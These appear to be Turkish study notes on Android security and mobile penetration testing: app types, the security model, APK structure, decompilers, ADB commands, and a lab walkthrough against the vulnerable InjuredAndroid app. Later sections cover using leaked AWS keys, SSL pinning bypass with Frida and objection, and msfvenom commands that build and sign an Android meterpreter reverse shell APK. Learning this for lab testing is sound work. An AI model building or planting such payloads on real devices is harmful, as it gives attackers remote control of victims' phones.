
Android, Google tarafından geliştirilen ve dünya genelinde mobil cihazlarda en yaygın kullanılan işletim sistemlerinden biridir. Android, açık kaynaklı bir işletim sistemi olup Linux tabanlıdır.
Android işletim sistemi, özellikle akıllı telefonlar, tabletler, akıllı televizyonlar, giyilebilir cihazlar ve diğer mobil cihazlar için tasarlanmıştır. Günümüzde "Native" ve "Hybrid" olarak iki tür android uygulama geliştirme yaklaşımı vardır.

### Native Android Uygulamaları

- Native uygulamalar, doğrudan Android işletim sistemi için özgün bir programlama dili ve geliştirme ortamı kullanılarak oluşturulan uygulamalardır. Android uygulamaları Java veya Kotlin gibi resmi Android programlama dilleri kullanılarak geliştirilir. Bu tür uygulamalar, Android işletim sistemi ve cihazlarıyla tam uyumluluk sağlayarak yüksek performans ve doğal kullanıcı deneyimi sunarlar.

Avantajları:
- Yüksek performans
- Doğal kullanıcı deneyimi
- Tam erişim

Dezavantajları:
- Platform bağımlılığı
- Geliştirme süreci

### Hybrid Android Uygulamaları

- Hybrid uygulamalar, web teknojileri (HTML, CSS ve JavaScript , React vb.) ile geliştirilip, native bir WebView içerisinde çalışan ve Android API'lerine erişim sağlayan uygulamalardır. Bu tür uygulamalar genellikle Cordova/PhoneGap, Ionic gibi çerçeveler kullanılarak geliştirilir.

Avantajları:
- Tek kod tabanı
- Daha az maliyet
- Kolay güncelleme

Dezavantajları:
- Performans
- Sınırlı erişim
- Kullanıcı deneyimi

### Android Güvenlik Modeli

1. İzolasyon ve Kısıtlamalar:
Android, Linux'un güvenlik modelini kullanarak, her uygulamanın bir benzersiz kullanıcı kimliği (UID) ve grup kimliği (GID) ile çalışmasını sağlar. Bu, uygulamaların diğer uygulamalar ve sistem bileşenleri ile etkileşimini  sınırlandırır ve bir uygulamanın diğer uygulamalardaki verilere doğrudan erişememesini sağlar.

2. Uygulama Bazlı İzinler:
Android, uygulama izinlerini kullanarak uygulamaların belirli kaynaklara erişimini yönetir. Kullanıcılar, uygulamayı yüklerken uygulama izinlerini onaylamalıdır. 

3. AndroidManifest.xml ve İzin Tanımları:
Uygulama izinleri, uygulamanın AndroidManifest.xml dosyasında tanımlanır. Bu dosya, uygulamanın özelliklerini, izinlerini, bileşenlerini ve diğer önemli bilgileri içerir. Uygulama kullanıcılardan belirli izinleri istediğinde, kullanıcılar uygulamanın bu izinlere erişimine izin verip vermeyeceklerini seçebilirler.

4. Uygulama Sertifikasyonu:
Uygulamanın bir cihaza yüklenmesi için, uygulama geliştiricisi tarafından imzalanmış bir sertifikaya sahip olması gerekir. Bu sertifika, uygulamanın kimliğini doğrulamak ve uygulamanın güvenliğini sağlamak için kullanılır. Google Play Store gibi resmi uygulama mağazaları, yalnızca sertifikalı uygulamalara izin verir.

5. Dalvik ve ART Sanal Makineleri:
Android, uzun süre Dalvik Virtual Machine (DVM) üzerinde çalıştı. Ancak Android 5.0 Lollipop ve sonraki sürümlerde, Dalvik yerine Android Run Time (ART) sanal makinesi kullanılmaya başlandı. ART, uygulama performansını ve derleme sürelerini artırarak uygulamaların daha hızlı çalışmasına olanak tanır.

6. Kullanıcı Güvenliği ve Kilitleme:
Android'de kullanıcı güvenliği önemli bir rol oynar. Kullanıcılar, kilit deseni, PIN veya parola gibi güvenlik önlemleriyle cihazlarını kilitleyebilirler. Ayrıca, cihaz sahipliği, kayıp veya çalınma durumunda cihazı uzaktan kilitleme veya verileri silme gibi uzaktan yönetim seçenekleri sunar.

7. Root Erişimi ve Rootlanmamış Cihazlar:
Android, root erişiminin cihazın güvenliğini tehlikeye attığını ve kötü amaçlı yazılımların ve saldırıların hedefi olmasına neden olabileceğini farkında olmuştur. Rootlanmamış bir cihazda, "su" komutu gibi root erişimi sağlayan araçlar genellikle bulunmaz ve sistem güvenliği korunmuş olur.

### Android Uygulamalarının Çalışma Yapısı

Bir Android uygulaması, çeşitli bileşenlerin bir araya gelmesiyle oluşturulur. Her bir bileşen, belirli bir işlevi yerine getiren ve uygulamanın farklı özelliklerini sağlayan bir yapı taşıdır. 

1. Activity
Activity, Android uygulamasının kullanıcı arayüzüyle etkileşime girdiği temel bileşendir. Kullanıcılar, uygulama içindeki farklı ekranları arasında geçiş yaparken aslında farklı Activity'leri açarlar.

2. Service
Service, kullanıcı arayüzü olmadan arka planda çalışan uzun süreli işlemleri yöneten bileşendir.

3. Broadcast Receiver
Broadcast Receiver, sistemdeki yayınlanan bildirimleri dinleyen ve buna tepki veren bileşendir.

4. Content Provider
Content Provider, uygulamanın verilerini diğer uygulamalarla paylaşmasına ve başka uygulamaların verilere erişmesine olanak tanıyan bileşendir.

---

# Android Uygulama Temelleri

Bir Android projesi oluşturulduğunda, bu proje içinde yer alan farklı bileşenler ve kaynaklar, APK (Android Package) adı verilen bir arşive dönüştürülür. APK dosyası, uygulamanın tüm kodları, verileri, grafikleri ve diğer kaynakları içeren bir sıkıştırılmış dosya arşividir. APK dosyasının uzantısı ".zip" olarak değiştirildikten sonra WinRAR gibi arşiv programları ile dosya içeriği görüntülenebilir.

APK dosyasının içeriği genelde şu şekildedir:

| Dosya | Açıklama |
| - | - |
| classes.dex | APK dosyasının temelini oluşturan bu dosya, Android uygulamasının Java veya Kotlin programlama diliyle yazılmış kodlarını içerir. Bu kodlar, Android Virtual Machine (DVM) ve Android Run Time (ART) tarafından yorumlanır ve uygulamanın çalışmasını sağlar.
| AndroidManifest.xml | Bu XML dosyası, uygulamanın temel özelliklerini ve yapılandırmasını tanımlar. Uygulama bileşenleri, izinler, uygulama simgeleri, sürüm numarası ve diğer önemli bilgiler burada belirtilir. |
| resources.arsc | Bu dosya, uygulamanın kaynaklarının derlenmiş ve paketlenmi hali olarak yer alır. Android uygulamalarının yerelleştirme ve çoklu dil desteği için kullanılan çeviri dosyaları da burada bulunabilir. |
| lib | Bu klasör, uygulamanın farklı mimarilere uyumlu kütüphanelerini içerir. |
| assets | Bu klasör, uygulamanın kaynaklarına erişim sağlamak için kullanılan metin, ses, video ve diğer dosyaları içerir. Bu dosyalara erişim, AssetManager sınıfı aracılığıyla yapılır. |
| res | Bu klasör, uygulamanın düzenleri, görselleri, metinleri ve diğer kaynaklarını içerir. XML dosyaları şeklinde düzenlenir ve uygulama arayüzünün tasarımını tanımlar. |
| META-INF | Bu klasör, uygulama imzalama ve diğer APK meta bilgilerini içerir. |

---

# Kaynak Kod Dönüşümü

Kaynak kod dönüşümü (source code obfuscation) uygulama kodlarının anlaşılması ve tersine mühendislik ile açığa çıkarılmasını zorlaştıran bir güvenlik tekniklerinden biridir. Kaynak kod dönüşümü, uygulama kodlarını okunması zor bir hale getirerek uygulamanın güvenliğini arttırmayı amaçlar.

Uygulama kodları, Java veya Kotlin gibi yüksek seviyeli dillerde yazılır ve Android APK dosyasında "classes.dex" dosyası olarak bulunur. Normalde, bu kodlar anlaşılabilir ve okunabilir olabilir, bu nedenle uygulamanın güvenliği ve fikri mülkiyeti risk altında olabilir. Kaynak kod dönüşümü, bu riski azaltmak için kodların anlaşılabilirliğini ve okunabilirliğini bozarak kodları karmaşık hale getirir.

Obfuscation yöntemleri:

1. Obfuscation (Karıştırma): Obfuscation, değişken, fonksiyon ve sınıf adlarını anlamsız hale getirme işlemidir. Örneğin, değişken adları "a", "b", "c" gibi anlaşılması zor harflerle değiştirilir. Bu, kodu okuyan kişilerin kodu anlamasını zorlaştırır.

2. String Encryption (Dize Şifreleme): Obfuscation tekniğine benzer şekilde, metin dizelerini anlamsız karakterlerle değiştirir veya şifreler. Bu şekilde, hassas veriler veya API anahtarları gibi önemli bilgilerin kodda açıkça yer almasının önüne geçilir.
   
3. ProGuard: ProGuard, Android uygulamalarında sıkça kullanılan bir kaynak kod dönüşüm aracıdır. ProGuard, uygulama kodlarını küçültme, karıştırma ve iyileştirme işlemleri yaparak uygulamanın boyutunu küçültmeyi ve kodun okunabilirliğini azaltmayı sağlar.
   
4. DexGuard: DexGuard, ProGuard'ın daha gelişmiş ve Android özel bir sürümüdür. DexGuard, Android uygulamaları için daha kapsamlı ve güçlü güvenlik önlemleri sunar ve uygulamaların tersine mühendislikle açığa çıkarılmasını daha da zorlaştırır.

### Decompile Uygulamaları (DEX -> JAVA)

1. JD-GUI
2. JAD
3. JADX
4. Procyon
5. Dex2jar
6. enjarify

- Dex2jar aracı ile class dosyasına dönüştürülmüş olan Android uygulaması, JD-GUI aracı ile kaynak koduna geri çevirilebilir.
- Decompile edilmiş JAR kodu tekrar compile edilerek çalıştırılamaz.
- Decompile %100 geri dönüşüm sağlamaz.
- Decompile işleminin yetersiz olduğu durumlarda "Diassembling" işleminden geçirmek gerekebilir.

### Disassemble Uygulamaları (DEX -> .SMALI)

1. Baksmali
2. Dedexer
3. apktool

- Disassemble işlemi ile DEX dosyası okunabilir Dalvik Bytecode'a dönüştürülüyor. Dalvik bytecode dosyası modifiye edilebilir. Modifiye edilen dosya tekrar imzalanıp, paketlenip cihazda çalıştırılabilir.

---

# Mobil Sızma Testi Ortamı ve Kurulan Araçlar

### ADB (Android Debug Bridge)

| Komut |  Açıklama |
| - | - |
| adb devices | Cihazları listeleme |
| adb shell pm list packages | Uygulamaları listeleme |
| adb install path/to/app.apk | Uygulama yükleme |
| adb uninstall package_name | Uygulama kaldırma |
| adb shell screencap /sdcard/screenshot.png <br/> adb pull /sdcard/screenshot.png | Ekran görüntüsü çekme |
| adb shell screenrecord /sdcard/screenrecord.mp4 <br/> adb pull /sdcard/screenrecord.mp4 | Cihazda ekran kaydı yapma |
| adb logcat | Logcat'i izleme |
| adb reboot | Cihazı yeniden başlatma |
| adb shell reboot -p | Cihazı kapatma |
| adb push path/to/source/file /sdcard/destination/file | Dosyaları cihaza kopyalama |
| adb pull /sdcard/source/file path/to/destination/file | Cihazdan dosyaları bilgisayara kopyalama |
| adb shell dumpsys activity activities \| grep "ResumedActivity" | Etkin olan Activity'leri listeleme|
| adb shell am start -n package_name/activity_name | Uygulamayı başlatma |
| adb shell pm clear package_name | Uygulama temizleme (veri ve önbellekleri silme) |
| adb shell input keyevent 26 | Cihazda ekranı açma  (sayısal ekran kilidi) |
| adb shell input keyevent 224 | Cihazda ekranı kapatma (sayısal ekran kilidi) |
| adb shell settings put system user_rotation 0 | Cihazın oryantasyonunu ayarlama | 
| adb shell settings put system screen_brightness 100 | Ekran parlaklığını ayarlama |
| adb shell settings put global airplana_mode_on 1 <br/> adb shell am broadcast -a android.intent.action.AIRPLANE_MODE | Ayarları sıfırlama |
| adb shell dumpsys meminfo | Cihazın RAM kullanımını gösterme |
| adb shell top | CPU kullanımını gösterme |
| ab shell vmstat | CPU ve Bellek kullanımını gösterme |
| adb root <br/> adb remount |  Cihazı geri alma (rootlu cihazda) |
| adb get-state | Etkin USB hata ayıklama durumunu gösterme |
| adb shell netstat | Ağ bağlantılarını gösterme |
| adb shell route | Yönlendirme tablosunu gösterme |
| adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:1 | Ekranın yatay/dikey yönlendirmesini döndürme |

---

# Android Static Analysis

- Telefon üzerinden apk çekme

```shell
emu64xa:/ $ pm list packages | grep "youtube"
package:com.google.android.apps.youtube.music
package:com.google.android.youtube
emu64xa:/ $ pm path com.google.android.apps.youtube.music
package:/product/app/YouTubeMusicPrebuilt/YouTubeMusicPrebuilt.apk
```

```powershell
PS C:\Users\akrc2\OneDrive\Desktop> adb pull /product/app/YouTubeMusicPrebuilt/YouTubeMusicPrebuilt.apk yt_music_pulled.apk
/product/app/YouTubeMusicPrebuilt/YouTubeMusicPrebuilt.apk...le pulled, 0 skipped. 69.3 MB/s (65868521 bytes in 0.906s)
```

- Kullanılan uygulama [InjuredAndroid](https://github.com/B3nac/InjuredAndroid)

- Uygulamayı yüklemek için

```
adb install .\InjuredAndroid-1.0.12-release.apk
```

### AndroidManifest.xml

- APK dosyasının JADX-GUI ile açıyorum. Daha sonra "Resources" klasöründen AndroidManifest.xml dosyasını açıyorum. Burada sdk versiyonu, uygulama izinleri gibi bazı özellikleri görüyorum.

![[android_manifest_xml.png]]

* Aynı işlemi bu sefer "apktool" aracı ile yapıyorum.

```powershell
PS C:\Users\akrc2\OneDrive\Masaüstü\Tools\Android Security> apktool d .\InjuredAndroid-1.0.12-release.apk -f
I: Using Apktool 2.8.1 on InjuredAndroid-1.0.12-release.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: C:\Users\akrc2\AppData\Local\apktool\framework\1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
Press any key to continue . . .
```

![[apktool_decompile.png]]

### Enumerating AWS Storage Buckets

- Uygulamamızda 8. bayrağı bulmak için bir AWS uygulaması aramamız gerekiyor. JADX-GUI ile "resources.arsc/res/values"  klasöründeki strings.xml dosyasının içinde bir AWS Access ID ve Key buluyorum. "cloud_enum" aracı ile bir tarama yapıyorum.

```shell
python3 cloud_enum.py -k injuredandroid
```

- Bulduğum key ve id ile bucket'ın içerisini görüntülemeye çalışıyorum.

```shell
aws configure --profile injured_android
aws s3 ls s3://injuredandroid --profile injured_android
```

### Finding Harcoded Strings

- Hardcoded strings genellikle kaynak kodun içinde veya strings.xml dosyasının içinde bulunur. Bunlar;
1. Credentials,
2. URL's,
3. API Anahtarları,
4. Firebase URL olabilir.

![[finding_hardcoded_strings.png]]

### Enumerating Firebase Databases

```shell
python3 firebaseEnum.py -k injuredandroid
```

### Mobile Security Framework

- Kurulum

```shell
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
pip3 install -r requirements.txt
.\setup.bat
```

# Android Dynamic Analysis

- MobSF ile Dynamic Analysis yapmak için

```system
Environment Variable -> C:\Users\akrc2\AppData\Local\Android\Sdk\emulator
emulator -list-avds
emulator -avd <non_production_avd_name> -writable-system -no-snapshot
```

### SSL Pinning Bypass with Burp Suite

- Proxy ayarlarından "Import / Export CA Certificates" tuşuna basın.
- Sertifikayı "cert.CER" gibi bir isimle kaydedin.
- "adb push cert.CER /sdcard/Download" komutu ile sertifikayı cihaza atın.
- Daha sonra ayalarlara girip install credentialsa basıp sertifikayı yükleyin

Aynı işlem Proxyman aracı ile de yapılabilir.

### Patching Application using objection

- İndirmek için

```system
pip3 install objection
```

- Kullanmak için

```system
objection patchapk --source injured
```

### Manually Patching using Frida

[Link](https://koz.io/using-frida-on-android-without-root/)

- Yamalanmış uygulamayı yükledikten sonra

```system
objection explore
> android sslpinning disable
```


### MSFVenom Payloads

```system
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 R > android.apk
keytool -genkey -V -keystore key.keystore -alias keystore -ketalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk keystore
zipalign -v 4 android.apk shell.apk

msfconsole
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
```